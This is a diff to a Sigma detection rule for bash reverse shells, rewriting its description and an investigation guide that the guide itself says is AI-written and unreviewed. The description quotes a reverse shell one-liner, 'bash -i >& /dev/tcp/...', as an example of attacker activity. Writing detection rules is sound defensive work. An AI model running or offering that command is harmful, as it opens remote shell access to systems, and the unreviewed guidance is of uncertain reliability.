@@ -1,8 +1,8 @@
 title: Linux Reverse Shell Indicator
 id: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
 status: test
-description: Detects a bash contecting to a remote IP address (often found when actors
-  do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
+description: Detects a bash contecting to a remote IP address (often found when 
+  actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
 references:
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d9921e370b7c668ee8cc42d09b1932c1b98fa9dc/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 author: Florian Roth (Nextron Systems)
@@ -27,25 +27,31 @@ falsepositives:
 level: critical
 note: |
   ### Technical Context
-  This detection rule is designed to identify instances of Linux reverse shell connections initiated by the Bash shell. Attackers often leverage reverse shells to establish remote access to compromised systems, allowing them to execute commands and manipulate the environment from afar. A typical command that triggers this detection might look like `bash -i >& /dev/tcp/<remote_ip>/<port> 0>&1`, which effectively redirects the input and output of the Bash shell to a remote IP address.
 
-  The relevant MITRE ATT&CK tactics involved in this scenario include **Execution** (ID: TA0002) as the primary technique for initiating code execution on the target, specifically under the sub-technique **Command and Scripting Interpreter: Unix Shell** (ID: T1059.004). The likely objective of the attacker is to maintain control over the system, exfiltrate data, or use it as a pivot point for further attacks.
+  This Sigma rule detects instances of the bash shell attempting to establish a network connection to a remote IP address, indicating potential reverse shell activity. The attacker’s objective is typically to gain unauthorized command line access to the victim's system, allowing for further exploitation or data exfiltration. This behavior falls under the MITRE ATT&CK framework's Execution tactic, specifically Technique T1059.004, which focuses on command and scripting interpreter execution.
 
-  Primary data sources for detecting these reverse shell connections include network connection logs from the Linux operating system, which will show outbound connections initiated by `/bin/bash` to external IP addresses other than the local loopback (127.0.0.1) or unspecified addresses (0.0.0.0).
+  The primary telemetry source for this detection is Linux network connection logs, with the key log artifacts being details of outbound connections initiated by bash. If malicious, this activity can lead to significant security incidents, including unauthorized access and data breaches. Importantly, this detection does NOT confirm successful exploitation; it only indicates an attempt to connect to a potentially unauthorized destination.
 
   ### Investigation Steps
-  - **Review Network Connection Logs**: Analyze logs that capture outbound network connections on the Linux host to identify any unusual communications initiated by the Bash shell, particularly those made to untrusted external IP addresses.
 
-  - **Check Process Creation Events**: Investigate process creation logs to see if there are any instances where bash was executed with a command redirecting network traffic, especially with the `-i` flag, which indicates interactive mode.
+  - **Identify the process initiating the connection:** Review network connection logs (e.g., `/var/log/syslog` or `journalctl`) for bash processes (PID, command line arguments) that match the alert. Look specifically for command lines similar to `bash -i >& /dev/tcp/<remote_ip>/<port> 0>&1`.
 
-  - **Analyze Bash History**: Examine the `.bash_history` file for commands executed by users on the system to identify any suspicious commands related to reverse shells or unauthorized network connections.
+  - **Check for known malicious IP addresses:** Correlate the destination IP address against threat intelligence feeds for known malicious IPs. Look for connections to IPs that have been flagged in previous compromises.
 
-  - **Monitor for Anomalous User Activity**: Investigate the surrounding activity of the user account initiating the Bash shell to determine if there are other behaviors typical of a compromised account, such as accessing sensitive areas of the system or unusual privilege escalations.
+  - **Review recent system changes:** Query logs to identify any recent, unexpected changes to user permissions or installation of new software (e.g., package manager logs). This will help identify potential vectors that led to the reverse shell.
+
+  - **Investigate legitimate use cases:** Validate if bash was intentionally executed by legitimate users for administrative tasks. Review the context around the discovered connection, such as historical user activity and whether it aligns with expected behavior in the environment.
+
+  - **Correlate with outbound traffic:** Examine firewall logs (e.g., `iptables`, `ufw`) for outbound traffic matches to the detected IP and port. Determine if there are other unusual outgoing connections in the timeframe that indicate non-standard behavior.
+
+  - **Verify persistence mechanisms:** If a reverse shell is confirmed, scan for other indicators of compromise, including unusual startup scripts or cron jobs, that may indicate an attempt to maintain access. Check directories like `/etc/init.d/` or execution agents like `systemd` units.
 
   ### Prioritization
-  This alert is categorized as critical due to the high impact reverse shells can have on enterprise environments, allowing attackers to execute arbitrary commands and potentially gain unauthorized access to sensitive data and systems. The likelihood of such activities indicates a serious threat that requires immediate investigation.
+
+  This alert is critical due to the potential impact of a successful reverse shell, which may allow adversaries to access sensitive systems and data, potentially leading to larger breaches. The likelihood of malicious abuse is high, as reverse shells are common tactics used by attackers during post-exploitation phases. The behavior detected is frequently exploited in various attack campaigns.
 
   ### Blind Spots and Assumptions
-  One potential gap in detection coverage is the inability to detect reverse shells initiated by other shell interpreters (e.g., `sh`, `ksh`, or `zsh`) or methods not involving Bash. The detection logic assumes that outbound connections will be fully logged and that appropriate logging configurations are in place on Linux systems to capture these actions. Additionally, the rule’s effectiveness relies on the absence of benign processes that might create similar network connections, which could result in false positives if not contextually validated.
+
+  Detection may miss activities that obfuscate the execution of bash, such as using alternative shells or employing encryption in the connection. Additionally, the rule presumes logs from the network connections are properly captured and retained. Legitimate administrative scripts or automated processes using bash could inadvertently trigger this alert. A related detection to strengthen coverage includes monitoring for unusual process creation associated with networking activity, such as Sysmon Event ID 1 with parameters for connection attempts initiated by shell processes.
 
   > **Disclaimer:** This investigation guide was created using generative AI technology and has not been reviewed for its accuracy and relevance. While every effort has been made to ensure its quality, we recommend validating the content and adapting it to suit specific environments and operational needs. Please communicate any changes to the detection engineering team.
